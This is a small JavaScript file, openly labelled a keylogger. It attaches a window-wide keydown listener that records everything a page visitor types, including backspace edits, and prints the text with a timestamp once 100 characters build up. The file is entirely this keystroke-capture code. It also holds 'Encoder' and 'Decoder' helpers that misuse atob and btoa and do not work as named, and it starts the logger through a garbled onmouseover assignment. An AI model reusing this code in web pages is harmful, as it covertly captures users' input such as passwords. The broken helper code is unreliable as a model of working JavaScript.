function Logger(LogLimit=false, Limit=0) {
    function Encoder(Input) {
        /* encodes text, for fun */
        var Encode = new TextEncoder();
        var EncodedStr = Encode.encode(Input);
        EncodedStr.reverse();
        return (atob(EncodedStr));
    }
    /* ArcaniusSainey@github */
    function LogData() {
        /* Log the time, becuase i can.  */
        DateLog = Date().split(' ')
        DateLog.Day = DateLog[0] + ' : ' + DateLog[3];
        DateLog.Month = DateLog[1];
        DateLog.Time = DateLog[4] + '-' + DateLog[6] + ' ' + DateLog[7] + ' ' + DateLog[8];
        return (`${DateLog.Day} : ${DateLog.Month} : ${DateLog.Time}`);
    }

    function Decoder(Input) {
        var Decode = new TextDecoder();
        Input = btoa(Input.reverse());
        Decode.decode(Input);
        return (Input);
    }/* Brians keylogger */
    var Log = "";
    console.log("Initializing... [{}]".replace('{}', Date()));
    window.addEventListener('keydown', function(e) {
        console.log('Key: ' + e.key);
        if (e.key == 'Backspace') {
            Log = Log.slice(0, -1);
        } else if (e.key == 'Undefined') {
            Log += " *Fn key* ";
        } else if (e.key == 'Shift') {
            Log += "";
        } else {
            Log += e.key;
        }
        if (LogLimit == true) {
            if (Log.length > Limit) {

                console.log(`${Log} |:End  ${LogData()}`);
                var DtRtrn = Log + ' |:End ' + LogData();
                Log = "";
            }
        }
    })
}
window.onmouseover = Logger(true, 100);
